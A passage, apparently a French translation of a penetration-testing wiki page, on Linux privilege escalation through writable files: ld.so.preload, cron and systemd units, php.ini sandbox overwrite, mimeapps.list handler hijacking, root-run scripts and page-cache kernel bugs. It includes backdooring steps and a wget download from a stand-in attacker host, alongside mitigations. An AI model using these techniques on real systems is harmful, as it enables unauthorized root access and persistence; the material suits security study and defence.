...
`/etc/ld.so.preload` est une liste de shared objects à l’échelle du système que le dynamic linker charge avant les autres shared objects. Le mode d’exécution sécurisée applique des restrictions supplémentaires au preloading, de sorte qu’un chemin de bibliothèque tel que `/tmp/pe.so` ne constitue pas une technique universelle pour les SUID-binary.\
Si vous pouvez créer ou modifier ce fichier, un processus qui le charge chargera la bibliothèque listée avant ses autres shared objects, ce qui permet l’exécution de code dans le contexte de ce processus.<sup>[[12]](#references)</sup>
...
chmod +x pre-commit
```
### Fichiers Cron et liés au temps

Si vous pouvez **écrire dans des fichiers liés à Cron que root exécute**, vous pouvez généralement obtenir une code execution lors de la prochaine exécution de la tâche. Les cibles intéressantes incluent :<sup>[[14]](#references)[[20]](#references)</sup>
...
- **Installer une backdoor dans une cible de timer existante** en modifiant le script ou le binaire qu’elle lance
...
- Certains systèmes utilisent des timers `systemd` au lieu du cron classique, mais l’idée de l’abus reste la même : **modifier ce que root exécutera ultérieurement**.<sup>[[20]](#references)</sup>

### Fichiers de service et de socket

Si vous pouvez écrire dans des **fichiers unit `systemd`** ou dans les fichiers auxquels ils font référence, vous pouvez éventuellement obtenir une exécution de code en tant que root en rechargeant et en redémarrant l’unit, ou en attendant que le chemin d’activation du service/socket se déclenche.<sup>[[16]](#references)[[17]](#references)[[18]](#references)[[19]](#references)</sup>
...
- Les chemins `EnvironmentFile=` accessibles en écriture et chargés par un service root
...
```
Si vous ne pouvez pas redémarrer vous-même les services, mais que vous pouvez modifier une unit activée par socket, vous devrez peut-être seulement **attendre une connexion client** pour déclencher l’exécution du service backdooré en tant que root.<sup>[[17]](#references)</sup>

### Écraser un `php.ini` restrictif utilisé par une sandbox PHP privilégiée

Certains daemons personnalisés valident le PHP fourni par l’utilisateur en exécutant `php` avec un **`php.ini` restrictif** (par exemple, `disable_functions=exec,system,...`). Si le code exécuté dans la sandbox dispose toujours d’une **primitive d’écriture** (comme `file_put_contents`) et que vous pouvez atteindre le **chemin exact du `php.ini`** utilisé par le daemon, vous pouvez **écraser cette configuration** pour lever les restrictions, puis soumettre un second payload qui s’exécute avec des privilèges élevés.<sup>[[2]](#references)</sup>

Flux typique :

1. Le premier payload écrase la configuration de la sandbox.
...
```
Si le daemon s’exécute en tant que root (ou effectue des validations avec des chemins appartenant à root), la seconde exécution fournit un contexte root. Il s’agit essentiellement d’une **privilege escalation via config overwrite** lorsque le runtime sandboxé peut toujours écrire des fichiers.

### binfmt_misc

`binfmt_misc` expose des enregistrements sous `/proc/sys/fs/binfmt_misc` ; chaque enregistrement associe un pattern de type de fichier à un interpréteur. L’impact sur les privilèges dépend de la personne autorisée à modifier l’enregistrement et du processus qui exécute ensuite le fichier correspondant. Vérifiez donc ces conditions avant de considérer cela comme une voie de privilege escalation.<sup>[[21]](#references)</sup>

### Overwrite schema handlers (like http: or https:)

Les environnements de bureau utilisent des associations MIME et des desktop entries pour choisir une application pour les URI schemes ; un attaquant capable d’écrire dans la configuration par utilisateur et les répertoires de desktop entries concernés peut rediriger ces schemes vers un launcher qu’il contrôle. En modifiant le fichier `$HOME/.config/mimeapps.list` pour associer les handlers d’URL HTTP et HTTPS à un fichier malveillant (par exemple, `x-scheme-handler/http=evil.desktop` et `x-scheme-handler/https=evil.desktop`), un clic de l’utilisateur peut invoquer cette desktop entry.<sup>[[22]](#references)[[23]](#references)[[24]](#references)</sup>
```bash
[Desktop Entry]
Type=Application
...
```
### Exécution par root de scripts/binaires contrôlés par l’utilisateur
...
- **Détecter l’exécution :** surveillez les processus avec pspy afin de détecter root invoquant des chemins contrôlés par l’utilisateur.<sup>[[25]](#references)</sup>
```bash
wget http://attacker/pspy64 -O /dev/shm/pspy64
chmod +x /dev/shm/pspy64
/dev/shm/pspy64   # wait for root commands pointing to your writable path
```
- **Confirm writeability:** assurez-vous que le fichier cible et son répertoire appartiennent à votre utilisateur et qu’il peut y écrire.
...
```
- **Déclencher l'action privilégiée** (par exemple, appuyer sur un bouton d'interface qui lance le helper). Lorsque root réexécute le chemin détourné, récupérer le shell escaladé avec `./rootshell -p`.

### Modification de fichiers binaires privilégiés limitée au page cache

Certains bugs du kernel ne modifient pas le fichier **sur le disque**. À la place, ils permettent de modifier uniquement la **copie du page cache** d'un fichier lisible. Si vous pouvez cibler un binaire **setuid** ou exécuté par **root**, l'exécution suivante peut lancer des octets contrôlés par l'attaquant depuis la mémoire et permettre une escalade de privilèges, même si le hash du fichier sur le disque reste inchangé.<sup>[[3]](#references)[[4]](#references)</sup>
...
- lorsque cette région référençait encore des pages adossées à un fichier et issues du splice, l'écriture aboutissait dans le **page cache du fichier cible**
...
- déclencher un overwrite contrôlé de petite taille en mémoire
...
DirtyClone (CVE-2026-43503) présente une autre variante du même pattern **page-cache-only write-to-root**, mais cette fois le sink est le **déchiffrement IPsec ESP** plutôt que `AF_ALG`.<sup>[[8]](#references)[[9]](#references)[[10]](#references)[[11]](#references)</sup>
...
- le netfilter `TEE` duplique le paquet via `nf_dup_ipv4()` -> `__pskb_copy_fclone()`
...
La leçon pour la revue est plus large que le CVE : si une mitigation dépend des **métadonnées skb/page** pour décider si une opération doit d'abord effectuer une copie, tout **chemin de clonage/copie qui conserve la page sous-jacente mais supprime les métadonnées** peut rouvrir silencieusement la primitive d'écriture.
...
En pratique, l'impact est identique à celui de l'exemple `AF_ALG` : le fichier sur le disque reste propre, mais `execve()` consomme les **octets modifiés du page cache** et fournit un shell root.<sup>[[8]](#references)[[9]](#references)</sup>
...
```
Les valeurs de configuration ci-dessous distinguent une interface chargeable d'une interface intégrée au kernel ; les règles de build crypto associent `CONFIG_CRYPTO_USER_API_AEAD` à `algif_aead`.<sup>[[26]](#references)[[27]](#references)</sup>
...
- les binaires setuid sont de bonnes cibles, car un patch limité au page cache peut suffire à transformer un accès local initial en accès root
...
```
S'il est compilé dans le kernel, certains disclosures ont signalé le blocage du chemin init avec :<sup>[[28]](#references)</sup>
```bash
initcall_blacklist=algif_aead_init
```
Ce type de mitigation mérite également d’être retenu pour d’autres LPE du kernel : si l’exploitation dépend d’une interface optionnelle spécifique, désactiver ou blacklister cette interface peut interrompre le chemin d’exploitation avant même qu’une mise à niveau complète du kernel soit disponible.<sup>[[6]](#references)[[28]](#references)</sup>

## References

- [1] [HTB Bamboo – détournement d’un script exécuté par root dans un répertoire PaperCut accessible en écriture par l’utilisateur](https://0xdf.gitlab.io/2026/02/03/htb-bamboo.html)
...
- [4] [Divulgation oss-security d’Openwall concernant CVE-2026-31431](https://www.openwall.com/lists/oss-security/2026/04/29/23)
- [5] [Correctif stable Linux : crypto: algif_aead - retour au fonctionnement out-of-place](https://git.kernel.org/stable/c/a664bf3d603dc3bdcf9ae47cc21e0daec706d7a5)
- [6] [Copy Fail — advisory CVE-2026-31431](https://copy.fail/)
- [7] [Theori / analyse technique de Xint](https://xint.io/blog/copy-fail-linux-distributions)
...
- [11] [Mitigation Linux antérieure : définir `SKBFL_SHARED_FRAG` pour les paquets UDP splice (`f4c50a4034e6`)](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=f4c50a4034e6)
- [12] [ld.so(8) — page du manuel Linux](https://man7.org/linux/man-pages/man8/ld.so.8.html)
- [13] [Git Hooks](https://git-scm.com/book/en/v2/Customizing-Git-Git-Hooks)
- [14] [crontab(5) — page du manuel Linux](https://man7.org/linux/man-pages/man5/crontab.5.html)
- [15] [run-parts(8) — page du manuel Debian](https://manpages.debian.org/bookworm/debianutils/run-parts.8.en.html)
...
- [28] [CERT VU#260001 : vulnérabilité du page cache de AF_ALG dans le Linux kernel](https://kb.cert.org/vuls/id/260001)
- [29] [modprobe(8) — page du manuel Linux](https://man7.org/linux/man-pages/man8/modprobe.8.html)
